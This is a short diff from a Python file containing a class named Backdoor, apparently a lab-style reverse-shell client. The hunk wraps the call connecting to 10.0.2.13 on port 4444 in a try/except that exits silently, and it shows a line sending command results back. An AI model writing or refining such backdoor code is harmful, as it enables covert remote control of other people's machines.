@@ -76,4 +76,7 @@ class Backdoor:
             self.reliable_send(command_result)
 
 
-Backdoor('10.0.2.13', 4444)
+try:
+    Backdoor('10.0.2.13', 4444)
+except Exception:
+    sys.exit()
